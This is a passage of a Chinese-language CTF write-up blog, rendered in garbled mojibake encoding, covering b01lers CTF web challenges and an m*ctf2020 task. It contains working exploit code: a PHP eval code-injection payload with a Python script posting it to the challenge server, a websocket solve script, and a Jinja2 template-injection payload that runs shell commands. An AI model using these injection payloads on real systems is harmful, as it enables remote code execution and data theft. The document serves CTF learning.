id="Whereâ€™s-Tron"><a href="#Whereâ€™s-Tron" class="headerlink" title="Whereâ€™s Tron?"></a>Whereâ€™s Tron?</h3><p>ç»™äº†æºç <br>å¯ä»¥ä»»æ„sql selectè¯­å¥æ‰§è¡Œã€‚å®ƒå”¯ä¸€çš„é™åˆ¶å°±æ˜¯<code>limit 20</code>æ‰€ä»¥ç›´æ¥æ³¨é‡Šæ‰ã€‚åœ¨è¿”å›çš„å‡ åƒæ¡æ•°æ®ä¸­ç›´æ¥æ‰¾tronã€‚å®ƒçš„æŸä¸€ä¸ªåˆ—ä¸­å°±æ˜¯flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> programs <span class="keyword">where</span> <span class="keyword">name</span> regexp <span class="string">"^Tron"</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="Next-Gen-Networking"><a href="#Next-Gen-Networking" class="headerlink" title="Next Gen Networking"></a>Next Gen Networking</h3><p>ç»™äº†æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_data</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">"packet"</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: packet not found&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $raw_packet = $_POST[<span class="string">"packet"</span>];</span><br><span class="line">        $packet = json_decode($raw_packet);</span><br><span class="line">        <span class="keyword">if</span>($packet == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: decoding packet&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($packet-&gt;version != <span class="number">6.5</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: wrong packet version&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $calculated_ihl = strlen($packet-&gt;version) + strlen(strval($packet-&gt;len)) + strlen(strval($packet-&gt;ttl)) + strlen(strval($packet-&gt;seqno)) + strlen(strval($packet-&gt;ackno)) + strlen($packet-&gt;algo) + <span class="number">64</span>;</span><br><span class="line">        $calculated_ihl = $calculated_ihl + strlen(strval($calculated_ihl));</span><br><span class="line">        <span class="keyword">if</span>($packet-&gt;ihl != $calculated_ihl <span class="keyword">or</span> $packet-&gt;ihl &gt; <span class="number">170</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: wrong header size&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($packet-&gt;len != strlen($raw_packet)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: mismatched packet size&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($packet-&gt;ttl - <span class="number">1</span> != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: invalid ttl&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($packet-&gt;ackno != $_COOKIE[<span class="string">"seqno"</span>] + <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: out of order packet&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($packet-&gt;algo != <span class="string">"sha256"</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: unsupported algorithm&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $checksum_str = <span class="string">"\$checksum = hash(\"$packet-&gt;algo\", strval($packet-&gt;ihl + $packet-&gt;len + $packet-&gt;ttl + $packet-&gt;seqno + $packet-&gt;ackno));"</span>;</span><br><span class="line">        <span class="keyword">eval</span>($checksum_str);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($packet-&gt;checksum != $checksum) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: checksums don't match&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $file_name_hash = hash(<span class="string">"md5"</span>, microtime());</span><br><span class="line">        $file_name = <span class="string">"sent/"</span>.$file_name_hash.<span class="string">".packet"</span>;</span><br><span class="line">        $packet_file = fopen($file_name, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open packet file"</span>);</span><br><span class="line">        fwrite($packet_file, $packet-&gt;data);</span><br><span class="line">        fclose($packet_file);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&lt;h1&gt;Packet data written&lt;/h1&gt;&lt;div&gt;&lt;a href=\""</span>.$file_name.<span class="string">"\"&gt;"</span>.$file_name_hash.<span class="string">".packet&lt;/a&gt;&lt;/div&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Send Packet.&lt;/title&gt;</span><br><span class="line">        &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/style.css"</span>/&gt;</span><br><span class="line">        &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/tron.css"</span>/&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div id=<span class="string">"main-wrapper"</span>&gt;</span><br><span class="line">            &lt;div class="content-page"&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> <span class="keyword">echo</span> get_data(); <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>ä¸»è¦å°±æ˜¯ä¸€ä¸ªevalå¯ä»¥åˆ©ç”¨ã€‚ç„¶åç”¨å¼±ç±»å‹ç»•è¿‡å±æ€§çš„è¦æ±‚rce<br>å¦‚ä¸‹:</p><ul><li><code>1));?&gt;&lt;?php system(&quot;cat ./sent/flag.packet.php&quot;); -1 = 0</code>æˆç«‹ã€‚<br>poc<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$raw_packet = <span class="string">'&#123;"version":6.5,"len":110&#125;'</span>;</span><br><span class="line">$packet=json_decode($raw_packet,<span class="keyword">true</span>);</span><br><span class="line">$packet[<span class="string">"version"</span>] = <span class="number">6.5</span>;</span><br><span class="line">$packet[<span class="string">"ttl"</span>]=<span class="string">"1));?&gt;&lt;?php system('cat /var/www/tron-eval/packets/sent/flag.packet.php');//"</span>;</span><br><span class="line">$packet[<span class="string">"seqno"</span>]=<span class="number">0</span>;</span><br><span class="line">$packet[<span class="string">"ackno"</span>]=<span class="number">1</span>;</span><br><span class="line">$packet[<span class="string">"algo"</span>]=<span class="string">"sha256"</span>;</span><br><span class="line">$calculated_ihl = strlen($packet[<span class="string">"version"</span>]) + strlen(strval($packet[<span class="string">"len"</span>])) + strlen(strval($packet[<span class="string">"ttl"</span>])) + strlen(strval($packet[<span class="string">"seqno"</span>])) + strlen(strval($packet[<span class="string">"ackno"</span>])) + strlen($packet[<span class="string">"algo"</span>]) + <span class="number">64</span>;</span><br><span class="line">$calculated_ihl = $calculated_ihl + strlen(strval($calculated_ihl));</span><br><span class="line">$packet[<span class="string">"ihl"</span>]=$calculated_ihl;</span><br><span class="line">$packet[<span class="string">"len"</span>]=strlen(json_encode($packet));</span><br><span class="line">var_dump(json_encode($packet));</span><br></pre></td></tr></table></figure>exp<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://chal.ctf.b01lers.com:3002/packets/send.php'</span></span><br><span class="line">payload=<span class="string">"""&#123;"version":6.5,"len":164,"ttl":"1));?&gt;&lt;?php system('cat \/var\/www\/tron-eval\/packets\/sent\/flag.packet.php');\/\/","seqno":0,"ackno":1,"algo":"sha256","ihl":157&#125;"""</span></span><br><span class="line">r=requests.post(url,data=&#123;<span class="string">'packet'</span>:payload&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></li></ul><h3 id="Derezzy"><a href="#Derezzy" class="headerlink" title="Derezzy"></a>Derezzy</h3><p>æœ‰ç‚¹å¯æƒœã€‚å…¶å®ç¡®å®ä¸éš¾çš„ã€‚ä¸»è¦è¿˜æ˜¯æ²¡æƒ³åˆ°å®ƒçš„websocketç«¯å£æ˜¯å¯¹å¤–çš„,æœ‰äº›éƒé—·ã€‚</p><p>é¦–å…ˆé¢˜ç›®æ•´ä½“ä¸Šä¼¼ä¹æ˜¯ä¸€ä¸ªæ’­æ”¾åŠŸèƒ½ã€‚ç„¶åå¯ç”¨çš„å†…å®¹ä¸å¤šã€‚åªæœ‰ä¸€ä¸ªmain.js,ç”¨js-beautifyerç¾åŒ–ä¸‹åçœ‹çœ‹å…¶ä¸­çš„å…³é”®ä»£ç ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateServer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.post(<span class="string">"update"</span>, &#123;</span><br><span class="line">        request: <span class="string">"listen"</span>,</span><br><span class="line">        path: <span class="string">"# wait where were my non-dynamic files..../app.lua"</span></span><br><span class="line">    &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="string">"success"</span> == b ? <span class="built_in">console</span>.log(<span class="string">"successful update"</span>) : <span class="built_in">console</span>.log(<span class="string">"unsuccessful update"</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—çŸ¥äº†updateè·¯ç”±ä¸ä¼ é€’çš„æŸä¸ªå‚æ•°pathæç¤ºæˆ‘ä»¬æœ‰app.lua.å› ä¸ºæ˜¯non-dynamicæ‰€ä»¥å°±æ˜¯staticé™æ€äº†ã€‚staticä¸‹æœ‰ä¸€ä¸ªfilesæ–‡ä»¶å¤¹ã€‚å¯ä»¥åœ¨é‡Œé¢æ‰¾åˆ°<code>app.lua</code>.</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">[&#123;</span><br><span class="line">      update = <span class="string">"/update"</span></span><br><span class="line">    &#125;] = respond_to(&#123;</span><br><span class="line">      GET = <span class="function"><span class="keyword">function</span><span class="params">(self)</span></span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">          render = <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">end</span>,</span><br><span class="line">      POST = <span class="function"><span class="keyword">function</span><span class="params">(self)</span></span></span><br><span class="line">        <span class="keyword">if</span> self.POST.request == <span class="string">'listen'</span> <span class="keyword">then</span></span><br><span class="line">          <span class="keyword">if</span> <span class="keyword">not</span> (self.session.id) <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">              <span class="keyword">local</span> listener = Listens:<span class="built_in">find</span>(csrf.generate_token(self))</span><br><span class="line">              <span class="keyword">if</span> listener <span class="keyword">then</span></span><br><span class="line">                self.session.id = listener.id</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                listener = Listens:<span class="built_in">create</span>(&#123;</span><br><span class="line">                  id = csrf.generate_token(self),</span><br><span class="line">                  count = <span class="number">0</span></span><br><span class="line">                &#125;)</span><br><span class="line">                self.session.id = listener.id</span><br><span class="line">              <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">          <span class="keyword">if</span> self.session.id <span class="keyword">and</span> <span class="keyword">not</span> Listens:<span class="built_in">find</span>(self.session.id) <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> listener = Listens:<span class="built_in">create</span>(&#123;</span><br><span class="line">              id = csrf.generate_token(self),</span><br><span class="line">              count = <span class="number">0</span></span><br><span class="line">            &#125;)</span><br><span class="line">            self.session.id = listener.id</span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">          <span class="keyword">local</span> listener = Listens:<span class="built_in">find</span>(self.session.id)</span><br><span class="line">          <span class="keyword">local</span> data = <span class="string">"flag&#123;........&#125;"</span></span><br><span class="line">          <span class="keyword">if</span> listener.count &gt;= <span class="number">3470</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> ws = w.new_from_uri(<span class="string">"ws://localhost:8181"</span>)</span><br><span class="line">            <span class="built_in">assert</span>(ws:connect())</span><br><span class="line">            data = &#123;</span><br><span class="line">              user = self.session.id,</span><br><span class="line">              count = listener.count</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">assert</span>(ws:send(cjson.encode(data)))</span><br><span class="line">            data = cjson.decode(<span class="built_in">assert</span>(ws:receive()))</span><br><span class="line">            <span class="built_in">assert</span>(ws:<span class="built_in">close</span>())</span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">          <span class="keyword">local</span> utct</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">            <span class="keyword">local</span> _accum_0 = &#123; &#125;</span><br><span class="line">            <span class="keyword">local</span> _len_0 = <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">string</span>.<span class="built_in">gmatch</span>(listener.updated_at, <span class="string">"%d+"</span>) <span class="keyword">do</span></span><br><span class="line">              _accum_0[_len_0] = item</span><br><span class="line">              _len_0 = _len_0 + <span class="number">1</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">            utct = _accum_0</span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">          <span class="keyword">local</span> updatetime = <span class="built_in">os</span>.<span class="built_in">time</span>(&#123;</span><br><span class="line">            year = utct[<span class="number">1</span>],</span><br><span class="line">            month = utct[<span class="number">2</span>],</span><br><span class="line">            day = utct[<span class="number">3</span>],</span><br><span class="line">            hour = utct[<span class="number">4</span>],</span><br><span class="line">            <span class="built_in">min</span> = utct[<span class="number">5</span>],</span><br><span class="line">            sec = utct[<span class="number">6</span>]</span><br><span class="line">          &#125;)</span><br><span class="line">          <span class="keyword">if</span> listener ~= <span class="literal">nil</span> <span class="keyword">and</span> <span class="built_in">os</span>.<span class="built_in">time</span>() - updatetime &gt;= <span class="number">104</span> <span class="keyword">then</span></span><br><span class="line">            listener.count = listener.count + <span class="number">1</span></span><br><span class="line">            listener:update(<span class="string">"count"</span>)</span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">          <span class="keyword">return</span> &#123;</span><br><span class="line">            json = &#123;</span><br><span class="line">              <span class="built_in">status</span> = <span class="string">"success"</span>,</span><br><span class="line">              id = self.session.id,</span><br><span class="line">              timestamp = listener.updated_at,</span><br><span class="line">              count = listener.count,</span><br><span class="line">              updatetime = updatetime,</span><br><span class="line">              currenttime = <span class="built_in">os</span>.<span class="built_in">time</span>(),</span><br><span class="line">              flag = data</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">          redirect_to = <span class="string">"/"</span></span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå•ç‹¬çœ‹ä¸‹updateè·¯ç”±çš„è§„åˆ™ã€‚ä¸éš¾å‘ç°åªæœ‰count&gt;=3470æ—¶ä¼šä¸websocketé€šä¿¡ã€‚æ­¤æ—¶æœåŠ¡ç«¯ä¼šè¿”å›ä¸€äº›å†…å®¹ã€‚å…¶ä¸­åº”è¯¥å°±æ˜¯çœŸæ­£çš„flagäº†ã€‚</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> listener.count &gt;= <span class="number">3470</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">local</span> ws = w.new_from_uri(<span class="string">"ws://localhost:8181"</span>)</span><br><span class="line">    <span class="built_in">assert</span>(ws:connect())</span><br><span class="line">    data = &#123;</span><br><span class="line">        user = self.session.id,</span><br><span class="line">        count = listener.count</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">assert</span>(ws:send(cjson.encode(data)))</span><br><span class="line">    data = cjson.decode(<span class="built_in">assert</span>(ws:receive()))</span><br><span class="line">    <span class="built_in">assert</span>(ws:<span class="built_in">close</span>())</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ²¡æœ‰ç„¶åäº†ã€‚ã€‚ã€‚æˆ‘ä»¥ä¸ºä¸å¯èƒ½è®©é€‰æ‰‹è·Ÿwebsocketé€šä¿¡å°±è·‘å»çœ‹luaæœ‰æ²¡æœ‰ä»€ä¹ˆå…¶ä»–æ–¹æ³•ä¿®æ”¹æ—¶é—´å‚æ•°ã€‚ç»“æœå°±æ‰è¿›äº†rabbithole.çŸ¥é“èƒ½é€šä¿¡çš„è¯ï¼Œè§£å†³æ–¹æ³•å°±å¾ˆç®€å•äº†<br>å› ä¸ºæœ‰æºç æ‰€ä»¥åœ¨è‡ªå·±æœåŠ¡å™¨æ­å»ºäº†å¤ç°ä¸‹ã€‚<br>è¿™ä¸ªé¢˜è¿˜æœ‰éå¸¸è„‘æ´çš„åœ°æ–¹ã€‚å®ƒè¿”å›çš„ç»“æœæ˜¯ç”¨flagä¸ä½ çš„åå­—è¿›è¡Œå¼‚æˆ–ã€‚æ‰€ä»¥æˆ‘ä»¬ä¼ é€’è¶³å¤Ÿé•¿çš„åå­—å¹¶ä¸”ä¸ä¹‹å¼‚æˆ–è¿˜åŸflag.<br>å®˜æ–¹è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">()</span>:</span></span><br><span class="line">    uri = <span class="string">"ws://xxx:8181"</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(uri) <span class="keyword">as</span> websocket:</span><br><span class="line">        name = <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line">        data = &#123;<span class="string">"user"</span>: name, <span class="string">"count"</span>: <span class="number">3500</span>&#125;</span><br><span class="line">        <span class="keyword">await</span> websocket.send(json.dumps(data))</span><br><span class="line">        resp = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> resp:</span><br><span class="line">            print(chr(ord(r) ^ ord(<span class="string">'A'</span>)), end=<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">asyncio.get_event_loop().run_until_complete(solve())</span><br></pre></td></tr></table></figure><p>webé¢˜ç›®å°±è¿™ä¹ˆå¤šã€‚æ•´ä½“ä¸Šæ¯”è¾ƒç®€å•ã€‚æœ€åä¸€ä¸ªæœ‰ç‚¹è„‘æ´.ä¸è¿‡é¡ºå¸¦ç€çœ‹äº†ä¸‹luaæ„Ÿè§‰è¿˜æ˜¯è›®æœ‰æ„æ€çš„ã€‚å†™webåº”ç”¨çš„æ€è·¯æœ‰ç‚¹æ¥è¿‘nodejs.</p><h2 id="m-ctf2020"><a href="#m-ctf2020" class="headerlink" title="m*ctf2020"></a>m*ctf2020</h2><p>è¿™ä¸ªæ¯”èµ›å»çœ‹æ—¶å·²ç»åªå‰©2å°æ—¶äº†ã€‚ç„¶åtgç¾¤é‡Œå…¨æ˜¯æ¯›å­ï¼Œçœ‹ä¸æ‡‚è®²ä»€ä¹ˆâ€¦â€¦åªèƒ½çœ‹çœ‹gitlabä¸Šä¸€äº›é¢˜ç›®çš„æ€è·¯äº†ã€‚<br>é¢˜ç›®è´¨é‡ä¸é”™ç„¶åè«åçš„å¾ˆå¯¹èƒƒå£ã€‚å°±æ˜¯æ—¶é—´å¤ªç´§åŠ ä¸Štcléƒ½æ²¡åšå‡ºæ¥2333.æœ‰ä¸€ä¸ªä¸“é—¨çš„åºåˆ—åŒ–åˆ†ç±»ã€‚éå¸¸æœ‰æ„æ€ã€‚</p><h3 id="Web-wiki"><a href="#Web-wiki" class="headerlink" title="Web-wiki"></a>Web-wiki</h3><p>é¢˜ç›®å¼€å§‹åªèƒ½æ˜ç¡®çš„æ˜¯xffä¼¼ä¹ä¼šåœ¨é¦–é¡µæ¸²æŸ“ï¼ŒåŠ ä¸Šæ˜¯pythonä¸éš¾æƒ³åˆ°ssti.ä½†æ˜¯æ›´æ”¹xffè®¿é—®ä¼šå‘ç°æˆ‘ä»¬å¹¶ä¸èƒ½æ§åˆ¶æ¸²æŸ“çš„å†…å®¹ã€‚é‚£ä¹ˆè¯´æ˜å¯èƒ½éœ€è¦æºç äº†ã€‚<br>å­˜åœ¨ä¸€ä¸ªè·¯å¾„ç©¿è¶Šè·å–æºç ã€‚å…¶å®è¿™ä¹Ÿç®—pythonæ¯”è¾ƒç»å…¸çš„æ¼æ´äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/index/&lt;path:dir&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfile</span><span class="params">(dir)</span>:</span></span><br><span class="line">    check_dir = Disabled(str(dir))</span><br><span class="line">    xff = str(request.headers.getlist(<span class="string">'X-Forwarded-For'</span>)[<span class="number">0</span>]).split(<span class="string">','</span>)[<span class="number">1</span>]</span><br><span class="line">    check_xff = Disabled(xff)</span><br><span class="line">    <span class="keyword">if</span> (check_xff.abort_rq()):</span><br><span class="line">        xff = str(request.headers.getlist(<span class="string">'X-Forwarded-For'</span>)[<span class="number">0</span>]).split(<span class="string">','</span>)[len(xff)<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (check_dir.check_blocked()):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> open(os.path.join(<span class="string">'/app/static'</span>, dir), <span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">                data = file.read()</span><br><span class="line">                file.close()</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span> PermissionError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(my_template(xff.replace(<span class="string">'.'</span>, <span class="string">''</span>)))</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç¡®å®å¯ä»¥xffè¾¾æˆssti.ä¸è¿‡éœ€è¦å–<code>,</code>åçš„å†…å®¹ä¸ºå¯æ§ç‚¹ã€‚ç„¶åä¸èƒ½åŒ…å«<code>.</code><br>é‚£å°±å¾ˆç®€å•äº†ã€‚ç”¨atträ¸€æ¡ç»§æ‰¿é“¾æˆ–è€…ç›´æ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request[<span class="string">'application'</span>][<span class="string">'__globals__'</span>][<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>)[<span class="string">'popen'</span>](<span class="string">'env'</span>)[<span class="string">'read'</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span 